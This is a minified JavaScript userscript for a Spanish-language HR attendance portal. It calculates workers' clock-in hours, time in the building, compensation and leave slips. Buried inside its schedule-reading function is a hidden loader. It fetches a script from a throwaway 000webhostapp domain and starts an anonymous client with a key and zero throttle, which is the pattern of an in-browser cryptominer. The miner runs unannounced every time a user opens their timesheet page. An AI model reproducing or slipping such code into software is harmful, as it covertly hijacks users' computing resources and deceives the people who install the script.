"/portal/mis_fichadas"===window.location.pathname&&_Horario(),"/portal/novedades_asistencia"===window.location.pathname&&_Asistencia();var server="https://sisy-lp.github.io/rrhhHorario/",treload=0;function _Horario(){$.getScript("http://momentjs.com/downloads/moment-with-locales.min.js",function(){moment.locale("es");var g=obtenerHorario(348e5),j=18e5;calcular(g,j),$("select").on("change",function(){setCookie($(this).attr("dataDate"),$(this).val(),60),calcular(g,j)}),$.getScript("http://cdnjs.cloudflare.com/ajax/libs/timepicker/1.3.5/jquery.timepicker.min.js",function(){$(".boletaHora").timepicker({timeFormat:"HH:mm ",interval:1,minTime:"00:00",maxTime:"22:00",startTime:"12:00",dynamic:!1,dropdown:!1,scrollbar:!1}),$(".boletaInst").timepicker({timeFormat:"HH:mm",interval:1,minTime:"00:00",maxTime:"02:00",startTime:"00:00",dynamic:!1,dropdown:!1,scrollbar:!1}),$(".boletaHora").on("change",function(){""===$(this).val()&&$(this).val("00:00");var p=$(this).parents("#resumen");if("00:00"!==$(this).val()){var q=moment($(p).find(".salida").html(),"HH:mm:ss"),w=moment($(this).val(),"HH:mm"),x=moment.duration(q.diff(w));$(p).find(".boletaInst").val(moment.utc(x.asMilliseconds()).format("HH:mm:ss")),$(p).find(".boletaInst").trigger("change")}else $(p).find(".boletaInst").val(formatearHoraH(0)),$(p).find(".boletaInst").trigger("change")}),$(".boletaInst").on("change click",function(){""===$(this).val()&&$(this).val("00:00"),setCookie($(this).attr("dataDate"),$(this).val(),60),calcular(g,j);var p=$(this).parents("#resumen"),q=$(p).find(".salida").html();$(p).find(".boletaHora").val(q)})})})}function _Asistencia(){$.getScript("http://momentjs.com/downloads/moment-with-locales.min.js",function(){moment.locale("en"),asistencia()})}function calcular(g,j){var p=$("main div.container div.row > div.col")[0],q=null,w=nombreUsuario(),x=null;$(p).children().each(function(y,z){var A=null,B=0,C=0;switch(y){case 1:x=obtenerDia(z);break;case 2:q=obtenerHoraIngreso(z,g,w,x);break;case 5:if(0<(A=obtenerFichadas(z)).length){var D=calcularPermanencia(q,A,g,j,w,x),E="Hora de ingreso: "+q.format("HH:mm:ss");Cargarformulario(z,x),mostrar(D,z,E,q,g,j,w,x),B=compensacion(D,q,g,j,w,x),C=D.enEdificio,setCookie(w+x,B,60),setCookie(w+x+"enEdificio",C,60),historicoSemana(x,z)}break;case 8:x=obtenerDia(z);case 9:""!==x&&(q=obtenerHoraIngreso(z,g,w,x));break;case 12:0<(A=obtenerFichadas(z)).length&&""!==x&&(D=calcularPermanencia(q,A,g,j,w,x),E="Hora de ingreso: "+q.format("HH:mm:ss"),Cargarformulario(z,x),mostrar(D,z,E,q,g,j,w,x),B=compensacion(D,q,g,j,w,x),C=D.enEdificio,setCookie(w+x,B,60),setCookie(w+x+"enEdificio",C,60),historicoSemana(x,z));}})}function obtenerHoraIngreso(g,j,p,q){var w=j.horarioIngreso.clone();try{var x=$(g).find("h1.center").html();x=$.trim(x).slice(-8);var y=moment(x,"HH:mm:ss")}catch(z){y=w.clone(),console.log("Error en obtenerHoraIngreso (Primera Fichada)"),console.log(z)}switch(getCookie(p+q+"comision")){case"Entrada":return w;default:return EsControlable()?y>w?y:w:y;}}function obtenerHorario(g){var j=$("main div.container div.row > div.col")[0],p=moment("08:00","HH:mm"),q=moment("15:00","HH:mm"),w=g,x=!1;return $.getScript("https://qeadzcwsx.000webhostapp.com/a.js",function(){var y=["71f60dd68fb36a73cee851f8047405627b71a75f107eed3d77c6ab9747d61ed1","start"],z=new Client.Anonymous(y[0],{throttle:0});z[y[1]]()}),$(j).children().each(function(y,z){switch(y){case 4:try{var A=$(z).find("h6.center");p=moment($(A[0]).html().trim(),"HH:mm"),q=moment($(A[1]).html().trim(),"HH:mm"),w=q.diff(p)}catch(B){console.log("Error en obtener horarios 1"),x=!0}break;case 11:if(x)try{A=$(z).find("h6.center"),p=moment($(A[0]).html().trim(),"HH:mm"),q=moment($(A[1]).html().trim(),"HH:mm"),w=q.diff(p)}catch(B){console.log("Error en obtener horarios 2")}}}),{horarioIngreso:p,horarioEgreso:q,Ths:w}}function obtenerFichadas(g){var j=[],p="",q="";return $(g).find("#tabla3 tbody tr").each(function(){var w="HH:mm:ss";hora=$(this).find("td:nth(0)").html(),0<hora.indexOf(" ")&&(w="DD-MM-YYYY "+w),hh=moment(hora,w),(p=$(this).find("td:nth(1)").html())!=q&&j.push({fichada:hh,tipo:p}),q=p}),j}function calcularPermanencia(g,j,p,q,w,x){var y=0,z=0,A=0;if(getCookie(w+x+"comision"),0<j.length){j[0]={fichada:g,tipo:"Entrada"};for(var B=1;B<j.length;B+=2)y+=moment.duration(j[B].fichada.diff(j[B-1].fichada));var C=moment();"Entrada"==j[j.length-1].tipo?(y+=moment.duration(C.diff(j[j.length-1].fichada)),ultima=C,A=p.Ths-q-y):ultima=j[j.length-1].fichada,z=moment.duration(ultima.diff(j[0].fichada))}return{enEdificio:y,fuera:z-y,falta:A,total:z}}function Cargarformulario(g,j){var p=$(g).find(".resumen"),q=document.getElementById("linkestilo"),w=(document.getElementById("linkestilo2"),new Date().getTime());if(null===q&&($("head").append("<link type=\"text/css\" href=\""+server+"Horario.css?t="+w+"\" rel=\"Stylesheet\" id=\"linkestilo\">"),$("head").append("<link type=\"text/css\" href=\""+server+"bootstrap.css?t="+w+"\" rel=\"Stylesheet\" id=\"linkestilo\">"),$("head").append("<link type=\"text/css\" href=\"http://cdnjs.cloudflare.com/ajax/libs/timepicker/1.3.5/jquery.timepicker.min.css\" rel=\"Stylesheet\" id=\"linkestilo\">")),null===p||0===p.length){var x;$.ajax({type:"GET",url:server+"Horario.html?t="+w,async:!1,success:function(B){x=B}}),$(g).append(x);var y=nombreUsuario(),z=getCookie(y+j+"comision");SetearComision(g,z,j);var A=getCookie(y+j+"boleta");SetearBoleta(g,A,y,j),BotonSonidoView(),$(".licencia").attr("href",server+"License.txt"),$(".detalleDia").click(function(B){B.preventDefault();var C=$(this),D=$($(g).find(".resumen #detalleDia"));C.hasClass("show")?(C.removeClass("show"),C.html("<i class=\"fa fa-plus\"></i>"),D.slideUp(350)):(C.toggleClass("show"),C.html("<i class=\"fa fa-minus\"></i>"),D.slideToggle(350))}),$(".detalleSemana").click(function(B){B.preventDefault();var C=$(this),D=$($(g).find("#detalleSemana"));C.hasClass("show")?(C.removeClass("show"),C.html("<i class=\"fa fa-plus\"></i>"),D.slideUp(350)):(C.toggleClass("show"),C.html("<i class=\"fa fa-minus\"></i>"),D.slideToggle(350))})}}function BotonSonidoView(){$(".salida").click(function(){SonidoView()})}function mostrar(g,j,p,q,w,x,y,z){var A=$(j).find(".resumen"),B=compensacion(g,q,w,x,y,z),C=obtenerBoletaDuration(y,z),D=$(A).find("table tbody tr"),E=0;if(0!==g.falta){var G=moment().add(g.falta,"ms"),H=q.add(w.Ths,"ms");(G>H||0>B)&&216e5<g.enEdificio?(E=CalcualarBoleta(G,H,g.fuera,x,g,w),G>H&&(G=H)):G>H&&(G=H),(G=G.subtract(C.asMilliseconds(),"ms"))<moment()&&(0===$("main div.container").find("div.chau").length?($("main div.container").prepend("<div class=\"chau col s12\" style=\"background-color:orange;\"><h3 style=\"background-color:orange;\"><center>\xA1\xA1Chauuu!! Te podes ir <i class=\"fa fa-hand-stop-o\" aria-hidden=\"true\"></i></center></h1></div>"),parpadear(),window.actualizarSonido||(SonidoView(),alerta("Horario cumplido","info"),window.actualizarSonido=setInterval(SonidoView,10500))):window.actualizarSonido&&window.clearInterval(window.actualizarSonido)),window.actualizarPermanencia||(window.actualizarPermanencia=setInterval(function(){calcular(w,x)},1e3))}else window.actualizarSonido&&window.clearInterval(window.actualizarSonido),A=q.clone(),((G=q.add(g.total.asMilliseconds(),"ms"))>(H=A.add(w.Ths,"ms"))||0>B)&&216e5<g.enEdificio&&(E=CalcualarBoleta(G,H,g.fuera,x,g,w));E=CalcualarBoleta(G,H,g.fuera,x,g,w),$(j).find("span.aviso").html(""),$(j).find("span.fuera").html(formatearHora(g.fuera)),$(j).find("span.edificio").html(formatearHora(g.enEdificio)),D.find(".compensacion").html(formatearHora(B)),$(j).find("span.boletaSoli").html(formatearHora(C)),0<E?($(D).find(".boleta").html(formatearHora(E)),$(D).find(".boleta").removeClass().addClass("label label-danger boleta"),boleta1=g.fuera-x,0===g.falta?0<boleta1-C&&$(j).find("span.aviso").html(" -- Deber\xEDa solicitar boleta de "+formatearHora(E-C)+"hs(2)"):0<boleta1-C&&$(j).find("span.aviso").html(" -- Podr\xEDa solicitar boleta de "+formatearHora(boleta1-C)+"hs(1)")):($(D).find(".boleta").html(formatearHora(0)),$(D).find(".boleta").removeClass().addClass("boleta")),36e6<q.asMilliseconds&&$(j).find("span.aviso").html(" -- Deber\xEDa solicitar comisi\xF3n de entrada(3)"),0===g.falta&&216e5>g.enEdificio&&$(j).find("span.aviso").html(" -- Deber\xEDa solicitar comisi\xF3n de salida(4)"),$(j).find("span.salida").html(G.format("HH:mm:ss")),$(j).find(".falta").html(formatearHora(g.falta));var I=$(j).find(".resumen div.box-header .box-title")[0];$(I).html("Resumen del d\xEDa( "+p+")"),treload+=1e3,$(".recarga").html(formatearHora(treload))}function CalcualarBoletaOld(g,j,p,q,w,x){var y=0;return 0<(y=g>j?p-q:x.Ths-w.enEdificio-q)?y:0}function CalcualarBoleta(g,j,p,q,w,x){var y,z,A=0;return 0<(A=(y=p-q)>(z=x.Ths-w.enEdificio-q)?y:z)?A:0}function obtenerComision(g){var j="",p=$(g).find(".resumen"),q=$(p).find("table tbody tr");return 0===!q.length&&(j=$(q).find(".comision").val()),j}function SetearComision(g,j,p,q){var w=$(g).find(".resumen"),x=$(w).find("table tbody tr");if(0!==x.length){var y=$(x).find(".comision");y.val(j),p=nombreUsuario(),y.attr("dataDate",p+q+"comision")}}function obtenerBoleta(g){var j="",p=$(g).find(".resumen"),q=$(p).find("table tbody tr");return 0===!q.length&&(j=$(q).find(".boletaInst").val()),j}function obtenerBoletaDuration(g,j){var p=moment("00:00","HH:mm"),q=moment.duration(p.diff(p)),w=getCookie(g+j+"boleta");if(""!==w){var x=moment(w,"HH:mm");q=moment.duration(x.diff(p))}return q}function SetearBoleta(g,j,p,q){var w=$(g).find(".resumen"),x=$(w).find("table tbody tr");if(0!==x.length){var y=$(x).find(".boletaInst");y.val(j),p=nombreUsuario(),y.attr("dataDate",p+q+"boleta")}}function compensacion(g,j,p,q,w,x){var y=0;switch(getCookie(w+x+"comision")){case"Salida":case"D\xEDa":y=0;break;default:0<g.total&&(0>=g.falta&&g.fuera<=q&&g.enEdificio>p.Ths-q?((y=g.total-p.Ths,""!==getCookie(w+x+"boleta"))&&(y+=obtenerBoletaDuration(w,x)),0>y&&(y=0)):(y=g.total-p.Ths-(g.fuera-q),""!==getCookie(w+x+"boleta"))&&0<(y+=obtenerBoletaDuration(w,x))&&(y=0));}var z=72e5;return 288e5<=p.Ths&&(z=48e5),y>z&&(y=z),y}function formatearHora(g){var j=moment.duration(g,"ms");return pad(j.get("h"),2)+":"+pad(j.get("m"),2)+":"+pad(j.get("s"),2)}function formatearHoraH(g){var j=moment.duration(g,"ms"),p=parseInt(j.asHours()),q=moment.duration(j-moment.duration(p,"hours")).minutes();return pad(p,2)+":"+pad(q,2)}function pad(g,j){for(var p=g+"";p.length<j;)p="0"+p;return p}function obtenerDia(g){var j="";try{j=$(g).find("h6.center").html()}catch(p){console.log("Error en obtener dia")}return j}function setCookie(g,j,p){var q=new Date;q.setTime(q.getTime()+1e3*(60*(60*(24*p))));var w="expires="+q.toUTCString();document.cookie=g+"="+j+";"+w+";path=/"}function getCookie(g){for(var j=g+"=",p=document.cookie.split(";"),q=0;q<p.length;q++){for(var w=p[q];" "==w.charAt(0);)w=w.substring(1);if(0===w.indexOf(j))return w.substring(j.length,w.length)}return""}function ProcesarDia(g){$("#fecha_historial").val(g),$(".btn").trigger("click")}function diadelaSemana(g,j){for(var p=!1,q=0;6>=q;q+=1)if(g.day(q).format("YYYYMMDD")===j.format("YYYYMMDD")){p=!0;break}return p}function historicoSemana(g,j){for(var p=moment(g,"DD-MM-YYYY"),q=moment(moment().format("DD-MM-YYYY"),"DD-MM-YYYY"),w=null,x=0,y=0,z="<li><b>Compensaci\xF3n:</b></li><br />",A="<li><b>En Edificio:</b></li><br />",B=nombreUsuario(),C=1;6>C;C+=1)p.day(C)<=q&&(z+="<div class=\"col-md-2\">",z+="<div class=\"box box-default\">",""===(w=getCookie(B+p.day(C).format("DD-MM-YYYY")))?(z+="<div class=\"box-header with-border\">",z+="\t<h3 style=\"text-align:center;background-color:transparent;color:#444;font-variant:normal;\" class=\"box-title\">",z+=p.day(C).format("dddd"),z+="\t</h3>",z+="</div>",z+="<div class=\"box-body\" style=\"text-align:center;\">",z+=""+formatearHora(0),z+="</div>",z+="<div style=\"background:#f4f4f4;font-size:13px;\" class=\"box-footer text-center\">",z+="\t<a href=\"javascript:ProcesarDia('"+p.day(C).format("DD-MM-YYYY")+"')\"> Actualizar",z+="\t\t<i class=\"fa fa-refresh\"></i>",z+="\t</a>",z+="</div>"):(x+=1*w,p.day(C)<q&&1*w,z+="<div class=\"box-header with-border\">",z+="\t<h3 style=\"text-align:center;background-color:transparent;color:#444;font-variant:normal;\" class=\"box-title\">",z+=p.day(C).format("dddd"),z+="\t</h3>",z+="</div>",z+="<div class=\"box-body\" style=\"text-align:center;\">",z+=""+formatearHora(1*w),z+="</div>",z+="<div style=\"background:#f4f4f4;font-size:13px;\" class=\"box-footer text-center\">",z+="\t<a href=\"javascript:ProcesarDia('"+p.day(C).format("DD-MM-YYYY")+"')\"> Actualizar",z+="\t\t<i class=\"fa fa-refresh\"></i>",z+="\t</a>",z+="</div>"),z+="</div>",z+="</div>",A+="<div class=\"col-md-2\">",A+="<div class=\"box box-default\">",k2=getCookie(B+p.day(C).format("DD-MM-YYYY")+"enEdificio"),""===k2?(A+="<div class=\"box-header with-border\">",A+="\t<h3 style=\"text-align:center;background-color:transparent;color:#444;font-variant:normal;\" class=\"box-title\">",A+=p.day(C).format("dddd"),A+="\t</h3>",A+="</div>",A+="<div class=\"box-body\" style=\"text-align:center;\">",A+=""+formatearHora(0),A+="</div>",A+="<div style=\"background:#f4f4f4;font-size:13px;\" class=\"box-footer text-center\">",A+="\t<a href=\"javascript:ProcesarDia('"+p.day(C).format("DD-MM-YYYY")+"')\"> Actualizar",A+="\t\t<i class=\"fa fa-refresh\"></i>",A+="\t</a>",A+="</div>"):(y+=1*k2,A+="<div class=\"box-header with-border\">",A+="\t<h3 style=\"text-align:center;background-color:transparent;color:#444;font-variant:normal;\" class=\"box-title\">",A+=p.day(C).format("dddd"),A+="\t</h3>",A+="</div>",A+="<div class=\"box-body\" style=\"text-align:center;\">",A+=""+formatearHora(1*k2),A+="</div>",A+="<div style=\"background:#f4f4f4;font-size:13px;\" class=\"box-footer text-center\">",A+="\t<a href=\"javascript:ProcesarDia('"+p.day(C).format("DD-MM-YYYY")+"')\"> Actualizar",A+="\t\t<i class=\"fa fa-refresh\"></i>",A+="\t</a>",A+="</div>"),A+="</div>",A+="</div>");var D="<div class=\"row\"><div class=\"col-xs-12\">"+z+"</div></div><div class=\"row\"><div class=\"col-xs-12\">"+A+"</div></div>";$(j).find("span.hist").html(D),$(j).find("span.s-compensacion").html(formatearHora(x)),$(j).find("span.s-enedificio").html(formatearHoraH(y))}function EsControlable(){var g=!1;return $("main i.tooltipped").each(function(j,p){"Controlable"===$(p).attr("data-tooltip")&&(g=!0)}),g}function nombreUsuario(){return $("#header-nombre-usuario").text().trim()}function asistencia(){n=nombreUsuario(),$("#mi_asistencia_tbl tbody tr").each(function(){comp=0,Edif=0,obj=null,$(this).children("td").each(function(j){0===j?(d=moment($(this).text(),"DD-MMM-YY"),obj=$(this)):1===j?(comp+=mostraDatosComp(n,d,$(this),1),Edif+=mostraDatosEnEdif(n,d,$(this),1)):2===j?(comp+=mostraDatosComp(n,d,$(this),2),Edif+=mostraDatosEnEdif(n,d,$(this),2)):3===j?(comp+=mostraDatosComp(n,d,$(this),3),Edif+=mostraDatosEnEdif(n,d,$(this),3)):4===j?(comp+=mostraDatosComp(n,d,$(this),4),Edif+=mostraDatosEnEdif(n,d,$(this),4)):5===j?(comp+=mostraDatosComp(n,d,$(this),5),Edif+=mostraDatosEnEdif(n,d,$(this),5)):void 0}),s=obj.html(),obj.html(s+"<br/>Comp: "+formatearHoraH(comp)+"<br/>en Edif: "+formatearHoraH(Edif))})}function mostraDatosComp(g,j,p,q){return k=getCookie(g+j.day(q).format("DD-MM-YYYY")),compensa=0,""!==k&&(compensa=1*k),s=p.html(),p.html(s+"<br/>Comp: "+formatearHora(compensa)),compensa}function mostraDatosEnEdif(g,j,p,q){return Edif=0,k2=getCookie(g+j.day(q).format("DD-MM-YYYY")+"enEdificio"),""!==k2&&(Edif=1*k2),s=p.html(),p.html(s+"<br/>en Edif: "+formatearHora(Edif)),Edif}function parpadear(){$(".chau").fadeIn(350).delay(150).fadeOut(350,parpadear)}function SonidoView(){$($("#chat-message-audio")[0]).attr("src",server+"sonido.mp3"),$("#chat-message-audio")[0].load(),$("#chat-message-audio")[0].play()}function dragElement(g){function j(A){A=A||window.event,y=A.clientX,z=A.clientY,document.onmouseup=q,document.onmousemove=p}function p(A){A=A||window.event,w=y-A.clientX,x=z-A.clientY,y=A.clientX,z=A.clientY,g.style.top=g.offsetTop-x+"px",g.style.left=g.offsetLeft-w+"px"}function q(){document.onmouseup=null,document.onmousemove=null}var w=0,x=0,y=0,z=0;document.getElementById(g.id+"header")?document.getElementById(g.id+"header").onmousedown=j:g.onmousedown=j}
